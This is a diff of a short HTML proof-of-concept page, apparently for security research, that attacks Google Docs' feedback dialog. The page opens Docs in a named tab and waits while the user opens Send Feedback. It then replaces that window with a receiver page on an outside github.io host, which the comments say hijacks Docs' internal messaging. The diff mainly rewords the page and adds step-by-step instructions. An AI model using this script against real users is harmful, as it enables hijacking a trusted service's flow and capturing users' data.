@@ -1,26 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Passive Docs Feedback Hijack</title>
+  <title>Google Docs Feedback Hijack – Named Window</title>
 </head>
 <body>
-  <h2>Passive Google Docs Feedback Hijack (Named Iframe Variant)</h2>
-  <p>This PoC passively injects a malicious iframe into a named window used by Docs feedback flow.</p>
+  <h2>🧪 Google Docs Feedback Hijack – Named Window Variant</h2>
+  <p>This attack swaps the Docs feedback iframe mid-session using native JS only (no bookmarklet, no DevTools).</p>
 
-  <button onclick="launch()">Launch Docs with iframe swap</button>
+  <ol>
+    <li>Click the button to open Docs in a new tab</li>
+    <li>In that tab, trigger <strong>Help → Send Feedback</strong></li>
+    <li>This page will wait and then hijack the iframe by replacing the tab</li>
+  </ol>
+
+  <button onclick="launch()">Launch Docs</button>
 
   <script>
     function launch() {
-      // Step 1: Open a new named tab (Docs will load here)
-      const win = window.open("https://docs.google.com/document/u/0/create", "docswin");
+      // Open Google Docs in a named tab
+      window.open("https://docs.google.com/document/u/0/create", "feedbackwin");
 
-      // Step 2: After delay, overwrite the iframe in that tab
+      // Wait 15 seconds to let user trigger feedback UI
       setTimeout(() => {
-        // Replace entire tab content with the attacker's receiver iframe
-        // This hijacks Docs' internal messaging logic
-        window.open("https://musgaas.github.io/receiver-test/receiver.html", "docswin");
-        console.log("✅ Replaced tab content with receiver.html");
-      }, 15000); // enough time for user to click "Send Feedback"
+        // Hijack that named window
+        window.open("https://musgaas.github.io/receiver-test/receiver.html", "feedbackwin");
+        console.log("✅ Iframe/tab replaced with receiver.html");
+      }, 15000);
     }
   </script>
 </body>
